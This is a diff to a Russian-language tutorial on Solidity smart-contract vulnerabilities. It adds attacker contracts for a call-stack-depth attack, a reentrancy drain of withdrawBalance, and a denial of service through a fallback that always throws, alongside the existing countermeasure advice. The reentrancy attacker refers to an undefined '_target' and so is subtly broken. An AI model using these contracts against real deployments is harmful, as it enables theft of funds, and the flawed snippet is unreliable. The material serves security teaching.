@@ -47,6 +47,13 @@ contract auction {
         recipient.send(refund); // эта строка исполнится не так, как ожидается
     }
 }
+// ATTACKER
+contract xxx {
+    function foo(address target, address recipient, uint iter) {
+        if (iter < 1023) foo(target, recipient, iter+1);
+        else auction(target).withdrawRefund(recipient);
+    }
+}
 ```
 
 **Противодействие:** минимизация вызовов внутри методов, приоритет записи и учета над вызовом другого метода; а также `.send()` возвращает `false` если не может быть исполнена, необходимо при каждой отправке средств проверять возвращаемое значение.
@@ -56,13 +63,29 @@ contract auction {
 
 ```
 // INSECURE
-mapping (address => uint) private userBalances;
+contract token {
+  mapping (address => uint) private userBalances;
 
-function withdrawBalance() public {
+  function withdrawBalance() public {
     uint amountToWithdraw = userBalances[msg.sender];
     // в этом месте внешний контракт может вызвать метод withdrawBalance снова
     if (!(msg.sender.call.value(amountToWithdraw)())) { throw; }
     userBalances[msg.sender] = 0;
+  }
+}
+/// ATTACKER
+contract xxx {
+  uint iter;
+  address target;
+  function foo(address _target) {
+    iter = 0;
+    target = _target;
+    token(_target).withdrawBalance();
+  }
+  function () payable {
+    if (iter < 10) // Withrawal 10 times
+      token(_target).withdrawBalance();
+  }
 }
 ```
 
@@ -86,6 +109,10 @@ contract Auction {
         currentLeader = msg.sender;
         highestBid = msg.value;
     }
+}
+// ATTACKER
+contract xxx {
+  function () payable { throw; }
 }
 ```
 
